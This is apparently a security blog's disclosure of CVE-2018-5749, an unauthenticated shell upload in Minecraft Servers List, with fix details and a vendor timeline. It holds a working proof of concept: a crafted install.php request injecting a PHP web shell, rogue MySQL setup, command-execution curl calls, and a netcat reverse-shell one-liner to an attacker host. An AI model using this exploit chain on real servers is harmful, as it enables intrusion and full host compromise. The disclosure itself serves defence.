---
layout: single
title: Minecraft Servers List Unauthenticated Shell Upload
date: 2018-01-18
categories:
  - security
  - websec
  - disclosure
tags:
  - minecraft
  - minecraft servers list
  - remote code execution
  - rce
  - shell upload
  - cve-2018-5749
excerpt: Due to a lack of input sanitisation and auto-removal of the installation script, an unauthenticated user is able to re-purpose the connect.php file to gain remote code execution.
---
## Overview
Due to a lack of input sanitisation and auto-removal of the installation script, an unauthenticated user is able to re-purpose the `connect.php` file to gain remote code execution.

## CVE-ID
[CVE-2018-5749](https://www.cvedetails.com/cve/CVE-2018-5749/)

## CVSS V3 Vector
[AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H/E:F/RL:O/RC:C](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H/E:F/RL:O/RC:C)

## Affected Products
* [Minecraft Servers List Lite](https://github.com/grohsfabian/minecraft-servers-list-lite)
* [Premium Minecraft Servers List](https://codecanyon.net/item/minecraft-servers-list/4062368)

## Versions Affected
All premium releases prior to 2.0.4 and all lite releases prior to commit [c1cd164](https://github.com/grohsfabian/minecraft-servers-list-lite/tree/c1cd164fc376ac00ab46409e0fe0261b770787b8).

## Solution
Delete `install.php` in existing installations, and for new installations use the following versions that were released on 17th January, 2018:

* **Premium Minecraft Servers List**: Version 2.0.4
* **Minecraft Servers List Lite**: [c1cd164](https://github.com/grohsfabian/minecraft-servers-list-lite/tree/c1cd164fc376ac00ab46409e0fe0261b770787b8) or later

## Proof of Concept
### Upload of Shell:
```http
POST /install.php HTTP/1.1
Host: 10.2.0.4
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.2.0.4/install.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 222
Cookie: PHPSESSID=nl614639vqc8khlf4qkbbb2ul2
Connection: close
Upgrade-Insecure-Requests: 1

database_server=10.2.0.10&database_user=shell&database_password=%22%3B%3F%3E%3C%3F%3D%60%24_GET%5B1%5D%60%3F%3E%3C%3Fphp+%2F%2F&database_name=minecraft&settings_url=http%3A%2F%2F10.2.0.4%2F&settings_title=rastating&submit=
```

### Usage of Shell:
```bash
curl "http://10.2.0.4/core/database/connect.php?1=whoami"
```

## Technical Overview
As of January 16th, 2018, all versions of the Minecraft Servers List Lite software, and the premium product it is derived from, are vulnerable to a remote code execution flaw, stemming from a lack of input sanitisation within the install procedure.

Although users are advised after a successful install to remove the `install.php` file, if they do not, they are left open to compromise of not just the web application, but potentially the entire host.

### The Problematic Code
The starting point of the process that creates this vulnerability is on lines 23-26 of `install.php`:

```php
$database_server    = $_POST['database_server'];
$database_user	    = $_POST['database_user'];
$database_password  = $_POST['database_password'];
$database_name	    = $_POST['database_name'];
```

At this point in the script, the values are not sanitised; and rightly so. Directly after the initialisation of these variables, on line 28, a connection to the MySQL server is attempted, and thus they must remain completely unmodified:

```php
$database = new mysqli($database_server, $database_user, $database_password, $database_name);
```

Following this, a number of checks are carried out, including a check to see if the database connection was successful, on lines 35-37:

```php
if($database->connect_error) {
	$errors[] = 'We couldn\'t connect to the database !';
}
```

So far, the lack of input sanitisation is fine for the operations carried out. However, if all the checks pass, a PHP file is written to disk using the unsanitised variables, on lines 51-64:

```php
/* Define the connect.php content */
$connect_content = <<<PHP
<?php
// Connection parameters
\$DatabaseServer = "$database_server";
\$DatabaseUser   = "$database_user";
\$DatabasePass   = "$database_password";
\$DatabaseName   = "$database_name";
// Connecting to the database
\$database = new mysqli(\$DatabaseServer, \$DatabaseUser, \$DatabasePass, \$DatabaseName);
?>
PHP;
```

Due to the lack of input sanitisation, it is possible to write any arbitrary value to this file.

### Exploitation
#### Creating The Payload
As the script must first successfully establish a connection to a MySQL server before it will create the `connect.php` file, the exploitability becomes slightly more difficult, in that a remote MySQL server must be used to help deliver the payload.

Due to the need for the connection to be established, the host, username and database name fields are not usable; as all characters used within a payload would be blacklisted by MySQL. The password field, however, has no blacklisted characters, but does have the added restriction of being a maximum of 32 characters.

With a payload space of 32 characters, and the knowledge that the content of `$database_password` is injected between two double quotation marks, a payload can be created which:

* Closes the quotation marks
* Closes the existing PHP block (to prevent any subsequent errors blocking shell execution)
* Inject a new PHP block containing the shell execution
* Open another PHP block, and comment out the remaining content of the line

The final payload weighs in at 27 characters and will take any value passed to the `1` parameter in a `GET` request, and execute it as a system command:

```
";?><?=`$_GET[1]`?><?php //
```

#### Setting Up MySQL
With a valid payload generated, a MySQL server must be setup on the attacking machine. After installing the MySQL server package(s), the configuration must be updated to bind to `0.0.0.0` in order to allow remote connections.

The file in which the default MySQL configuration is found can differ between distributions, but this can usually be done by editing `/etc/mysql/mysql.conf.d/mysqld.conf` and editing the `bind-address` property as per below:

```conf
# Instead of skip-networking the default is now to listen only on
# localhost which is more compatible and is not less secure.
bind-address            = 0.0.0.0 #127.0.0.1
```

After changing the binding, restart the service and use `netstat` to verify the change:

```shell_session
root@mysql:~# nano /etc/mysql/mysql.conf.d/mysqld.cnf
root@mysql:~# service mysql restart
root@mysql:~# netstat -an | grep 3306
tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN     
root@mysql:~#
```

#### Creating The Shell User and Database
Once MySQL is configured to allow remote connections, the next step is to create a database and a user with remote access to said database.

Login to the MySQL shell using the `mysql` program, and then issue the commands below:

```shell_session
mysql> create database minecraft;
Query OK, 1 row affected (0.00 sec)

mysql> create user 'shell'@'%' identified by '";?><?=`$_GET[1]`?><?php //';
Query OK, 0 rows affected (0.01 sec)

mysql> create user 'shell'@'localhost' identified by '";?><?=`$_GET[1]`?><?php //';
Query OK, 0 rows affected (0.00 sec)

mysql> grant all on minecraft.* to shell@'%';
Query OK, 0 rows affected (0.00 sec)

mysql> grant all on minecraft.* to shell@'localhost';
Query OK, 0 rows affected (0.00 sec)
```

In the example above, two `shell` users are created; one with a wild card host and one with `localhost`; this is simply so testing the vulnerability locally will also work.

Once the user has been created, connectivity should be verified by establishing a MySQL connection **to** the attacking machine, **from** the vulnerable machine:

```shell_session
rastating@ubuntu:/var/www/html$ mysql -h 10.2.0.10 -u shell -p
Enter password:
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 12
Server version: 5.7.20-0ubuntu0.16.04.1 (Ubuntu)

Copyright (c) 2000, 2017, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> status
--------------
mysql  Ver 14.14 Distrib 5.7.20, for Linux (x86_64) using  EditLine wrapper

Connection id:        12
Current database:    
Current user:        shell@10.2.0.4
SSL:            Not in use
Current pager:        stdout
Using outfile:        ''
Using delimiter:    ;
Server version:        5.7.20-0ubuntu0.16.04.1 (Ubuntu)
Protocol version:    10
Connection:        10.2.0.10 via TCP/IP
Server characterset:    latin1
Db     characterset:    latin1
Client characterset:    utf8
Conn.  characterset:    utf8
TCP port:        3306
Uptime:            13 min 49 sec

Threads: 2  Questions: 26  Slow queries: 0  Opens: 113  Flush tables: 1  Open tables: 32  Queries per second avg: 0.031
--------------
```

#### Uploading the Shell
Assuming the connection test comes back OK, indicating the configuration has been carried out correctly, the shell can now be uploaded by simply filling out the installation form with the connection details to the MySQL server that has been configured:

![](/assets/images/minecraft-servers-list-unauthenticated-shell-upload/install-form-submission.png)

After submitting the form, confirmation of the shell upload can be carried out by checking the content of the `/core/database/connect.php` file:

```shell_session
rastating@ubuntu:/var/www/html$ cat core/database/connect.php
<?php
// Connection parameters
$DatabaseServer = "10.2.0.10";
$DatabaseUser   = "shell";
$DatabasePass   = "";?><?=`$_GET[1]`?><?php //";
$DatabaseName   = "minecraft";

// Connecting to the database
$database = new mysqli($DatabaseServer, $DatabaseUser, $DatabasePass, $DatabaseName);

?>
```

#### Remote Code Execution
Once the shell has been successfully uploaded, remote code execution can now be utilised by passing system commands into the `1` parameter, as can be seen in the example output below:

```shell_session
rastating@mysql:~$ curl "http://10.2.0.4/core/database/connect.php?1=whoami%26pwd"
/var/www/html/core/database
www-data
rastating@mysql:~$
```

With the ability to execute system commands, a reverse shell can be acquired leading to a full server compromise:

```bash
curl "http://10.2.0.4/core/database/connect.php?1=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202>%261|nc%2010.2.0.10%208080%20>/tmp/f"
```

```shell_session
rastating@mysql:~$ nc -nvlp 8080
Listening on [0.0.0.0] (family 0, port 8080)
Connection from [10.2.0.4] port 8080 [tcp/*] accepted (family 2, sport 41960)
/bin/sh: 0: can't access tty; job control turned off
$ whoami && pwd
www-data
/var/www/html/core/database
$
```


## Timeline
* **2018-01-16**: Initial discovery
* **2018-01-17**: Vendor contacted
* **2018-01-17**: Vendor responded, implemented the fix and has prepared rollout with CodeCanyon and prepared an update for GitHub
* **2018-01-17**: CVE requested
* **2018-01-17**: Updates pushed to CodeCanyon and GitHub
* **2018-01-18**: Public disclosure
